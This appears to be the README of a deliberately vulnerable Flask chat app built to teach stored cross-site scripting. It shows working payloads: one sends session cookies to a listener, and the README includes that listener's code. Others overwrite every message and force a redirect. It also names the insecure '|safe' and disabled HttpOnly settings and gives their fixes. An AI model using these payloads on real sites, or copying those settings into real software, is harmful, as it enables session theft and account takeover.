# XSSChat

## What is it?

 **XSSChat** is a web chat written in **Python3, HTML, CSS and Javascript*** (with Flask as webserver/templating engine) with a persistent **SQL** database. Everything is portable and with no dependencies thanks to **Docker** (except Docker itself). It's purpose is showcasing the consequences of **Cross-Site-Scripting** vulnerabilities (XSS) that could be present in any Web Application simply because of little mistakes during configuration. Some pictures of the webapp:

![](/assets/gallery1.png)
![](/assets/gallery2.png)
![](/assets/gallery3.png)
![](/assets/gallery4.png)

## Usage:

To run the example, we need to have **Docker** installed and run:

```bash
docker compose build
docker compose up
```
or, on Windows:

```bash
docker-compose build
docker-compose up
```
then visit http://localhost.

## How bad is it?

If we look at the CAPEC-MITRE classification (**CAPEC-63**), XSS is tipically described as an attack with:

- Likelihood of Attack: **HIGH**
- Typical Severity: **VERY HIGH**

and can be usually performed with a **LOW** to **MEDIUM** skill level, depending on what the attacker wants to achieve.

## What are the consequences?

Usually, XSS can lead to:

- Steal of session ids, credentials, etc...
- Forceful browsing (forced redirect).
- Content spoofing.

And we will be able to see in this implementation that the attacker (any user potentially) can:

- **Steal** the session cookie and take **control** of the **account** (of any user that logs in), simply by having minimal server that listens for requests from the users' client.

- **Change** the **content** of the **messages** (by injecting javascript that can modify the content based on any chosen criteria), change the content of the page, and in general executing any arbitrary Javascript payload.

- Even render the chat **unusable**, by forcefully redirecting the user instantly to any other webpage.

## CVE Score:

Based on the fact that:
 - The attack vector is the **Network**.
 - The attack complexity is **medium to low**.
 - The attacker doesn't need **any privilege**.
 - The impact on **Confidentiality**, **Integrity** and **Availability** is very high.
 - 0 user interaction is required, just logging in (normal website use)-

We can give to such a vulnerability a solid **10.0** as [CVE Score](https://nvd.nist.gov/vuln-metrics/cvss/v4-calculator).

## Attack Examples:

### 1)
We could grab the **session token** of every user that opens the web chat, simply by sending:

```html
    <script> fetch("http://localhost:9000?" + document.cookie) </script>
```
In this way, we are sending the session cookie of the page as a http request parameter to localhost:9000. Assuming that we have a server listening on the endpoint **localhost:9000** (for testing purposes) that can be simply written in python with a few lines of code. E.G.:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def main():
    print(request.args)
    return "ok"

app.run("0.0.0.0", 9000)
```

Then, the received token can be **injected** in the **attacker's own browser** to acces the chat as the user, manage the profile and change his password. This process could be **automated** via a simple python script to automatically have the **ownership of the account of whoever accesses the chat**.

We can look at the listener's log from a test:

![](/assets/1.png)


### 2)

We could alter the content of all the messages in the chat, simply by sending:

```html
<script>
setInterval(() => {document.querySelectorAll(".message").forEach(entry => {
    entry.innerHTML = "HACKED"
})}, 1)
</script>
```

By doing this, javascript is replacing the content of all messages with "HACKED".

As we can see:

![](/assets/2.png)
### 3)

We could rendere the website unusable, by redirecting on any website, simply by sending:

```html
<script> window.location.href = "https://google.com" </script>
```

Loading...
![](/assets/3.0.png)
then redirected!
![](/assets/3.1.png)

And we could go on with any type of attack that involves arbitrary Javascript execution on browsers (e.g. starting malitious downloads, etc...).

## What's causing this vulnerabilities?

Well, the culprit of XSS in general in dis demonstration is this simple line in _chat.html_:

```
                    {{ messages|safe }}
```
where the **|safe** flag is what tells to the jinja2 templating system to avoid escaping any html syntax.

To be honest there is another misconfiguration, in _main.py_:

```python
app.config['SESSION_COOKIE_HTTPONLY'] = False
```

this is what lets javascript access the, otherwise unaccessible, session cookie. But i added it for demonstration purposes.

## Fixes:

Just Using default escaping ```{{ messagess }}``` is enough to render this implementation invulnerable to XSS attacks, but leaving the cookie policy on "HTTPONLY" is also a good mesure.